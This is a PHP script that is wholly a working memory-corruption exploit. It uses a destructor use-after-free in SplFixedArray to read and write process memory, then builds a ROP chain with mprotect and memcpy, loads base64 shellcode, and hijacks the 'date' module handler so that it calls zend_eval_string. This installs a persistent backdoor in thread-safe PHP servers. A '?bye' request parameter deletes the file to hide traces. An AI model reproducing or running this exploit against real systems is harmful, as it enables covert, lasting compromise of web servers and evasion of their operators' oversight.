<?php

if (isset($_GET['bye'])) {
    unlink(__FILE__);
	die('Bye!');
}

define('PT_LOAD',       1);
define('PT_DYNAMIC',    2);
define('PT_TLS',        7);
define('DT_GNU_HASH',   0x6ffffef5);
define('DT_STRTAB',     5);
define('DT_SYMTAB',     6);
define('DT_PLTGOT',     3);
define('DT_DEBUG',      0x15);
define('DT_JMPREL',     0x17);
define('DT_PLTRELSZ',   2);
define('DT_STRSZ',      10);
define('DT_INIT',       12);
define('DT_FINI',       13);

define('BIN_SIZE',      320);

function read(&$str, $p = 0, $s = 8) {
    $address = 0;
    for($j = $s-1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p+$j]);
    }
    return $address;
}

class Helper {
    public $a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8, $a9, $a10, $a11, $a12, $a13, $a14, $a15;      # //size = 0x118, binsize=320
}

//=======================================

class InvalidDestructor1 {
    public function __destruct() {
        global $obj, $shellcode_addr;
        $helper = new Helper;
        $s1 = str_repeat('B', BIN_SIZE - 24 - 8);
        $s2 = str_repeat('C', BIN_SIZE - 24 - 8);
        //free strings     
        unset($s2);
        unset($s1);
        $php_heap = read($obj[2], BIN_SIZE - 0x18);                 //reading the beginning of a free chunk on the heap
        $shellcode_addr = $php_heap - 3 * BIN_SIZE + 0x18;          //num 3 may be changed if not work
    }
}

class InvalidDestructor2 {
    public function __destruct() {
        global $obj, $str, $helper;
        $helper = $str . 'A';                               //overlap zval array

        $pwn = new Pwn($obj);
        $pwn->start();
    }
}

//=======================================

class Pwn {
    public function __construct(&$uaf_obj) {
        $this->obj = $uaf_obj;
    }

    //==========================================================

    public function leak($addr, $offset = 0, $size = 8) {
        global $helper;
        $this->write($helper, $addr + $offset - 0x10, 8);
        $leak = strlen($this->obj[2][2]);                           //access overlapped zvals array
        if ($size != 8) {
            $leak %= 2 << ($size * 8) - 1;
        }
        return $leak;
    }

    //==========================================================

    public function write(&$str, $value, $offset, $size = 8) {
        for ($i = 0; $i < $size; $i++) {
            $str[$i + $offset] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    public function leak_bytes($addr, $len, &$buff) {
        $offset = 0;
        while ($offset < $len) {
            $val = $this->leak($addr, $offset);      
            $this->write($buff, $val, $offset);
            $offset += 8;
        }
    }

    public function leak_str($addr) {
        $str = '';
        while (1) {
            $str .= pack('Q', $this->leak($addr));
            $pos = strpos($str, chr(0));
            if ($pos !== false) {
                return substr($str, 0, $pos);
            }
            $addr += 8;
        }
    }

    public function mem_write($fake_str_addr, $offset, $buff) {
        global $helper;
        $this->write($helper, $fake_str_addr, 8);
        for ($i=0; $i < strlen($buff); ++$i) {
            $this->obj[2][2][$i + $offset] = $buff[$i];
        }
    }

    //==========================================================

    public function absolute_ptr($ptr, $base) {
        if (0 < $ptr & $ptr < $base) {
            return $ptr + $base;
        }
        return $ptr;
    }

    public function gnu_hash($str) {
        $hash = 5381;
        $length = strlen($str);
        for ($i = 0; $i < $length; $i++) {
            $hash  = (($hash << 5) + $hash) + ord($str[$i]);
            $hash &= 0xFFFFFFFF;
        }
        return $hash & 0xFFFFFFFF;
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for ($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {              //ELF header
                return $addr;
            }
        }
    }

    public function parse_elf($base) {
        $e_phoff        = $this->leak($base, 0x20);
        $e_phentsize    = $this->leak($base, 0x36, 2);
        $e_phnum        = $this->leak($base, 0x38, 2);

        for ($i = 0; $i < $e_phnum; $i++) {
            $header  = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak($header, 0, 4);
            $p_flags = $this->leak($header, 4, 4);
            $p_vaddr = $this->leak($header, 0x10);
            $p_memsz = $this->leak($header, 0x28);
            if ($p_type === PT_DYNAMIC) {
                $this->dynamic_addr = $this->absolute_ptr($p_vaddr, $base);
                $this->dynamic_size = $p_memsz;
            } else if ($p_type === PT_LOAD && $p_flags === 5) {
                $this->text_addr = $this->absolute_ptr($p_vaddr, $base);
                $this->text_size = $p_memsz;
            }
        }  
        for ($i = 0; $i < $this->dynamic_size / 16; ++$i) {
            $d_tag  = $this->leak($this->dynamic_addr, 16 * $i);
            $d_un   = $this->leak($this->dynamic_addr, 16 * $i + 8);
            if ($d_tag === DT_GNU_HASH) {
                $this->hshtab_addr = $d_un;
            } else if ($d_tag === DT_STRTAB) {
                $this->strtab_addr = $d_un;
            } else if ($d_tag === DT_SYMTAB) {
                $this->symtab_addr = $d_un;
            } else if ($d_tag === DT_PLTGOT) {
                $this->pltgot_addr = $d_un;
            } else if ($d_tag === DT_JMPREL) {
                $this->jmprel_addr = $d_un;
            } else if ($d_tag === DT_PLTRELSZ) {
                $this->pltrelsz = $d_un;
            } else if ($d_tag === DT_STRSZ) {
                $this->strsz = $d_un;
            } else if ($d_tag === DT_INIT) {
                $this->init_addr = $this->absolute_ptr($d_un, $base);
            } else if ($d_tag === DT_FINI) {
                $this->fini_addr = $this->absolute_ptr($d_un, $base);
            }            
        }
    }

    public function search_got() {    
        $sizeof_plt_stub = 16;
        for ($i=0; $i < $this->pltrelsz / 0x18; ++$i) {
            $r_offset   = $this->leak($this->jmprel_addr, 24 * $i);
            $r_info     = $this->leak($this->jmprel_addr, 24 * $i + 8);
            $r_addend   = $this->leak($this->jmprel_addr, 24 * $i + 16);
            $r_info_sym = $r_info >> 32;
            $st_name    = $this->leak($this->symtab_addr, 24 * $r_info_sym, 4);
            $name       = pack('Q', $this->leak($this->strtab_addr + $st_name));
      
            if (strpos($name, 'memcpy'.chr(0)) === 0) {
                $memcpy_got     = 24 + $this->pltgot_addr + $i * 8;
                $memcpy_addr    = $this->leak($memcpy_got);
                echo 'memcpy found - 0x'.dechex($memcpy_addr).PHP_EOL;
            } else if (strpos($name, 'mprotect') === 0) {
                $mprotect_got   = 24 + $this->pltgot_addr + $i * 8;
                $mprotect_addr  = $this->leak($mprotect_got);                
                echo 'mprotect found - 0x'.dechex($mprotect_addr).PHP_EOL;
            } 
            if (isset($memcpy_addr, $mprotect_addr)) {
                break;
            }
        }
        if (empty($memcpy_addr) || empty($mprotect_addr)) {
            die("Can't parse PLT");
        }
        return [$memcpy_addr, $mprotect_addr];
    }

    public function find_symbol($symb) {
        global $php_binary_base;
        $nbuckets   = $this->leak($this->hshtab_addr, 0, 4);
        $symndx     = $this->leak($this->hshtab_addr, 4, 4);
        $maskwords  = $this->leak($this->hshtab_addr, 8, 4);
        
        $buckets = $this->hshtab_addr + 16 + 8 * $maskwords;
        $chains = $buckets + 4 * $nbuckets;
        $hsh = $this->gnu_hash($symb);
        $bucket = $hsh % $nbuckets;
        $ndx = $this->leak($buckets, 4 * $bucket, 4);
        $chain = $chains + 4 * ($ndx - $symndx);
        list($i, $hsh, $hsh2) = [0, $hsh & 0xfffffffe, 0];
        while (!($hsh2 & 1)) {
            $hsh2 = $this->leak($chain, 4 * $i, 4);
            if ($hsh === (0xfffffffe & $hsh2)) {
                $sym = $this->symtab_addr + 24 * ($ndx + $i);
                $pos = $this->leak($sym, 0, 4);
                $name = $this->leak_str($this->strtab_addr + $pos);
                if ($name === $symb) {
                    $symb_offset = $this->leak($sym, 8);
                    $symb_addr = $php_binary_base + $symb_offset;
                    return $symb_addr;
                }
            }
            $i++;
        }
        return 0;
    }

    public function search_ROP() {
        $offset = 0;
        while ($offset < $this->text_size) {
            $data   = pack('Q', $this->leak($this->text_addr, $offset)); 
            if (isset($pop_rdi, $pop_rsi, $pop_rdx, $pop_rax))
                break;
            //search for opcodes
            if (!$pop_rdi) {
                if (($pos = strpos($data, "\x5f\xc3")) !== false) {
                    $pop_rdi = $this->text_addr + $offset + $pos;
                    echo 'Found pop rdi -- 0x' . dechex($pop_rdi) . PHP_EOL;
                }
            }
            if (!$pop_rsi) {
                if (($pos = strpos($data, "\x5e\xc3")) !== false) {
                    $pop_rsi = $this->text_addr + $offset + $pos;
                    echo 'Found pop rsi -- 0x' . dechex($pop_rsi) . PHP_EOL;
                }
            } 
            if (!$pop_rdx) {
                if (($pos = strpos($data, "\x5a\xc3")) !== false) {
                    $pop_rdx = $this->text_addr + $offset + $pos;
                    echo 'Found pop rdx -- 0x' . dechex($pop_rdx) . PHP_EOL;
                }
            }
            if (!$pop_rax) {
                if (($pos = strpos($data, "\x58\xc3")) !== false) {
                    $pop_rax = $this->text_addr + $offset + $pos;
                    echo 'Found pop rax -- 0x' . dechex($pop_rax) . PHP_EOL;
                }
            }            

            $offset += 8;
        }
        if (empty($pop_rdi) || empty($pop_rsi) || empty($pop_rdx) || empty($pop_rax)) {
            die("Can't find ROP gadgets");
        }
        return [$pop_rdi, $pop_rsi, $pop_rdx, $pop_rax];
    }

    public function parse_ret_addr($addr, $callee) {
        $found = [];
        $arr = str_repeat('A', 1700);              //allocate one buffer
        $this->leak_bytes($addr, 1700, $arr);        
        for ($i=0; $i < strlen($arr) - 8; ++$i) {
            if ($arr[$i] === chr(0xe8)) {
                //calc address
                $offset = unpack("i", $arr[$i+1].$arr[$i+2].$arr[$i+3].$arr[$i+4])[1];
                $maybe_call = $addr + $i + $offset + 5;
                if (in_array($addr + $i + 5, $found) || ($this->text_addr > $maybe_call) || ($maybe_call > $this->text_addr + $this->text_size)) {
                    continue;
                }
                //test it's in .plt.sec
                $v1 = $this->leak($maybe_call);
                $v2 = $this->leak($maybe_call + 8);
                if (($v1 & 0xffffffffffffff) === 0x25fff2fa1e0ff3) {            //endbr bnd jmp
                    $p1 = pack('Q', $v1);
                    $p2 = pack('Q', $v2);
                    $offset = unpack('i', $p1[7].$p2[0].$p2[1].$p2[2])[1];      //get jmp offset
                    $got = $maybe_call + $offset + 11;
                    if ($this->leak($got) === $callee) {
                        echo 'Found call -- ' . dechex($addr + $i + 5) .PHP_EOL ;
                        $found []= $addr + $i + 5;
                    }
                }
            }
        }
        return $found;
    }

    public function scan_thread_stacks($ret_addr_list) {
        global $stack_region;
        $scan_size = 40000;
        //search for return addr in stacks
        foreach ($stack_region as $stack) {
            $pos = 0;
            echo 'Try scan region '.dechex($stack).PHP_EOL;
            while ($pos < $scan_size) {
                $val = $this->leak($stack - $pos - 8);
                if (in_array($val, $ret_addr_list, true)) {
                    $rip = $stack - $pos - 8;
                    echo 'RIP 0x' . dechex($val) . ' found on stack -- 0x' . dechex($rip) . PHP_EOL;
                    return $rip;
                }
                $pos += 8;                
            }
        }
        //not found
        die("Can't find RIP on stack");
    }

    public function search_for_zend_string($addr, $buflen) {
        $pos = 0;  
        while ($pos < 4000) {
            $v1 = $this->leak($addr - 0x18 - $pos);
            $v3 = $this->leak($addr - 0x8 - $pos);
            $refcount  = $v1 & 0xFFFFFFFF;
            if (0 <= $refcount && $refcount <= 1 && ($v3 > $pos + $buflen)) {
                echo 'Fake zend_string found in offset '   .   $pos. ' address ' . dechex($addr - 0x18 - $pos).PHP_EOL;
                return [$addr - 0x18 - $pos, $pos];
            }
            $pos++;
        }
        die("Can't find fake zend_string");
    }

    public function buffer_write($addr, $buffer) {
        global $helper;
        list($fake_zend_string, $pos) = $this->search_for_zend_string($addr, strlen($buffer));
        $helper[17] = ord(1);       //change type_flags
        $this->mem_write($fake_zend_string, $pos, $buffer);
        $helper[17] = ord(0);
    }

    public function get_module_handler_ptr() {
        $module_registry = $this->find_symbol('module_registry');
        $ht_bucket = $this->leak($module_registry + 0x10);
        for ($i=0; $i < 5; ++$i) {
            $module_entry_ptr   = $this->leak($ht_bucket);
            $module_name_ptr    = $this->leak($module_entry_ptr + 0x20);
            $name               = $this->leak_str($module_name_ptr);
            $activate_handler   = $module_entry_ptr + 0x40;
            if ($name === "date") {
                $date_activate_handler = $activate_handler;
                break;
            }
            $ht_bucket += 0x20;             //move to next Bucket
        }
        if (empty($date_activate_handler)) {
            die("Can't find zend_module handler");
        } 
        return $date_activate_handler;
    }

    public function check_already_done() {
        $module_registry = $this->find_symbol('module_registry');
        $ht_bucket = $this->leak($module_registry + 0x10);
        for ($i=0; $i < 5; ++$i) {
            $module_entry_ptr   = $this->leak($ht_bucket);
            $module_name_ptr    = $this->leak($module_entry_ptr + 0x20);
            $name               = $this->leak_str($module_name_ptr);
            $activate_handler   = $module_entry_ptr + 0x40;
            $activate_handler_address = $this->leak($activate_handler);
            if ($name === "date") {
                $date_activate_handler_address = $activate_handler_address;
                break;
            } 
            $ht_bucket += 0x20;             //move to next Bucket
        }
        return abs($date_activate_handler_address - $this->fini_addr) <= 0x1000;        
    }

    public function test_shellcode() {
        global $shellcode_addr, $shellcode, $b64_shellcode;
        //copy decoded shellcode
        for ($i=0; $i < strlen($shellcode); ++$i) {
            if ($i < strlen($b64_shellcode)) {
                $shellcode[$i] = $b64_shellcode[$i];
            }
        }
        //test
        if (dechex($this->leak($shellcode_addr)) != '9090909090909090') {
            die("Can't leak shellcode address");
        } else {
            echo 'Found shellcode in 0x'.dechex($shellcode_addr).PHP_EOL;
        }
    }

    public function prepare_shellcode() {
        global $shellcode, $fake_handler_code;
        //get symbols
        $func1  = $this->find_symbol('tsrm_get_ls_cache');
        $func2  = $this->find_symbol('zend_hash_str_find');
        $func3  = $this->find_symbol('zend_eval_string');
        $func4  = $this->find_symbol('core_globals_offset');
        if (!$func1 || !$func2 || !$func3 || !$func4) {
            die("Couldn't resolve function address for shellcode");
        }
        $value  = $this->leak($func4);
        $this->write($shellcode, $fake_handler_code, 8);            //set to pointer to shellcode
        $this->write($shellcode, $func1, 36);                       //set tsrm_get_ls_cache addr
        $this->write($shellcode, $func2, 50);                       //set zend_hash_str_find addr
        $this->write($shellcode, $func3, 64);                       //set zend_eval_string addr 
        $this->write($shellcode, $value, 79, 4);                    //set core_globals_offset value
    }

    public function create_ropchain() {
        global $shellcode_addr, $shellcode, $fake_handler_code;
        list($pop_rdi, $pop_rsi, $pop_rdx, $pop_rax) = $this->search_ROP();
        list($memcpy, $mprotect) = $this->search_got();  
        $zend_timeout = $this->find_symbol('zend_timeout');
        $module_handler_ptr = $this->get_module_handler_ptr();
        $page_addr = $fake_handler_code & ~(0x1000-1);

        echo 'Fake module handler code at 0x'.dechex($fake_handler_code).PHP_EOL;
        echo 'Module handler ptr at 0x'.dechex($module_handler_ptr).PHP_EOL;

        $rop = str_repeat('A', 0x130);
        //mprotect(page, 0x1000, READ|WRITE)
        $this->write($rop, $pop_rdi,                0x00);
        $this->write($rop, $page_addr,              0x08);
        $this->write($rop, $pop_rsi,                0x10);
        $this->write($rop, 0x1000,                  0x18);
        $this->write($rop, $pop_rdx,                0x20);
        $this->write($rop, 0x1|0x2,                 0x28);
        $this->write($rop, $mprotect,               0x30);
        //memcpy(addr, shellcode, 30);
        $this->write($rop, $pop_rdi,                0x38);
        $this->write($rop, $fake_handler_code,      0x40);
        $this->write($rop, $pop_rsi,                0x48);
        $this->write($rop, $shellcode_addr + 0x10,  0x50);
        $this->write($rop, $pop_rdx,                0x58);
        $this->write($rop, strlen($shellcode) - 0x10, 0x60);
        $this->write($rop, $memcpy,                 0x68);        
        //mprotect(page, 0x1000, READ|EXEC)
        $this->write($rop, $pop_rdi,                0x70);
        $this->write($rop, $page_addr,              0x78);
        $this->write($rop, $pop_rsi,                0x80);
        $this->write($rop, 0x1000,                  0x88);
        $this->write($rop, $pop_rdx,                0x90);
        $this->write($rop, 0x1|0x4,                 0x98);
        $this->write($rop, $mprotect,               0xa0); 
        //memcpy(module_handler_ptr, ptr, 8) ---  write 8 bytes to fake handler ptr
        $this->write($rop, $pop_rdi,                0xa8);
        $this->write($rop, $module_handler_ptr,     0xb0);
        $this->write($rop, $pop_rsi,                0xb8);
        $this->write($rop, $shellcode_addr + 8,     0xc0);
        $this->write($rop, $pop_rdx,                0xc8);
        $this->write($rop, 8,                       0xd0);
        $this->write($rop, $memcpy,                 0xd8);
        //for 16-byte stack align, use if segfault
        $this->write($rop, $pop_rdi + 1,            0xe0);    
        //call zend_timeout to finish script 
        $this->write($rop, $pop_rdi,                0xe8);
        $this->write($rop, 0,                       0xf0);
        $this->write($rop, $zend_timeout,           0xf8);
        return $rop;
    }

    public function start() {
        global $php_binary_base, $fake_handler_code;
        //parse php elf
        echo 'PHP library addr: 0x'.dechex($php_binary_base).PHP_EOL;
        $this->parse_elf($php_binary_base);
        //check that not backdoored already
        if ($this->check_already_done()) {
            die('Already backdoored');
        }
        //verify shellcode address
        $this->test_shellcode();
        //scan for RIP
        $func1  = $this->find_symbol('php_execute_script');
        $func2  = $this->find_symbol('zend_execute_scripts');     
        if (!$func1 || !$func2) {
            die("Couldn't resolve function address");
        }
        $possible_ret_addr = $this->parse_ret_addr($func1, $func2);
        if (empty($possible_ret_addr)) {
            die("Couldn't parse return address");
        }
        $rip = $this->scan_thread_stacks($possible_ret_addr);
        //set function address in shellcode
        $fake_handler_code = $this->fini_addr + 0x100;
        $this->prepare_shellcode();
        //write ROP
        $rop_chain = $this->create_ropchain();        
        $this->buffer_write($rip, $rop_chain);
        echo 'Done';
    }
}

function read_memory_map() {
    global $php_binary_base, $stack_region;
    $stack_region = array();
    $thread_stack_size = 0x800000;
    $libphp_prefix = 'libphp7';
    $pattern = '/(\w+)-(\w+)\s+.+\/' . $libphp_prefix . '/';
    $file = fopen("/proc/self/maps", "r");
    if (!$file) {
        die("Can't read memory maps");
    }
    while (($line = fgets($file)) !== false) {
        if (empty($php_binary_base) && strpos($line, '/' . $libphp_prefix) !== false) {
            preg_match($pattern, $line, $libphp);
            $php_binary_base = intval($libphp[1], 16);            
        } else {
            preg_match('/(\w+)-(\w+)\s+/', $line, $addr);
            if (intval($addr[2], 16) - intval($addr[1], 16) === $thread_stack_size) {
                $stack_region []= intval($addr[2], 16);
            }
        }
    }
    fclose($file);    
    if (empty($php_binary_base)) {
        die("Can't find PHP library. Maybe wrong libphp_prefix?");
    }
    if (count($stack_region) === 0) {
        die("Can't find any threads. Maybe not thread-safe PHP used.");
    }
}

function print_pid() {
    echo 'PID: '.getmypid().PHP_EOL;
}

function leak_shellcode() {
    global $obj, $shellcode;
    //alloc memory
    $shellcode  = str_repeat('X', BIN_SIZE - 24 - 8);
    $obj    = new SplFixedArray(5);
    $obj[2] = str_repeat('A', BIN_SIZE - 24 - 8);   
    $obj[3] = new InvalidDestructor1();
    $obj->setSize(2);
}

function start_pwn() {
    global $obj, $str;
    $str    = str_repeat('A', 16) . pack('Q', 0x06) . str_repeat('B', 10);      //zvals array
    $obj    = new SplFixedArray(5);
    $obj[2] = new SplFixedArray(4);
    $obj[3] = new InvalidDestructor2();
    $obj->setSize(2);
}

//=========================

$b64_shellcode = base64_decode("kJCQkJCQkJCQkJCQkJCQkPMPHvpVSInlSIPscIl9nIl1mEi4AwICAgICAgFIiUX4SLgEAwMDAwMDAkiJRfBIuAUEBAQEBAQDSIlF6MdF5AgHBgXGRbcASLhleGVjdXRlAEiJRa9IjUWvSIlF2EjHRdAAAAAASItV+LgAAAAA/9KLVeRIY9JIAdBIBXABAABIiUXISItFyEiJRcBIi0XASIlFuEiLRbgPtkAIPAd1RUiLRcBIiwBIi03YTItF8LoHAAAASInOSInHQf/QSIlF0EiDfdAAdB1Ii0XQSIsASI14GEiNRbdIi03oSInCvgAAAAD/0bgAAAAAycOQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ");

print_pid();
leak_shellcode();
read_memory_map();
start_pwn();

//=========================
